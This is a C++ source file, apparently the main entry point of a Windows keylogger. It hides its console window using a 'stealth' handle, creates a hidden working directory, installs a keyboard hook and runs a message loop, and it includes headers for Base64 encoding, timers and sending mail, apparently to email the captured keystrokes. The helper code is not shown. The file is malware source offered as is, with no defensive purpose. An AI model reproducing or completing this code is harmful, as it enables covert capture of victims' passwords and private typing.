#include <iostream>
#include <Windows.h>
#include "CustTime.h"
#include "KeyConstants.h"
#include "Base64.h"
#include "DirectoryCreate.h"
#include "Timer.h"
#include "SendMail.h"
#include "KeyboardHook.h"

using namespace std;
void hide();

int main(){
	hide(); // set console window to appear for a instant
	MSG Msg; // msg object to be processed, but actually never is processed

	DirectoryCreate::MKDir(DirectoryCreate::GetOurPath(true));

	InstallHook();

	while (GetMessage(&Msg, NULL, 0, 0)) // empties console window
	{
		TranslateMessage(&Msg);
		DispatchMessage(&Msg);
	}

	MailTimer.Stop();
	return 0;
}

void hide(){
	HWND stealth; // window handler used to hide the outputted console window
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, 0);
}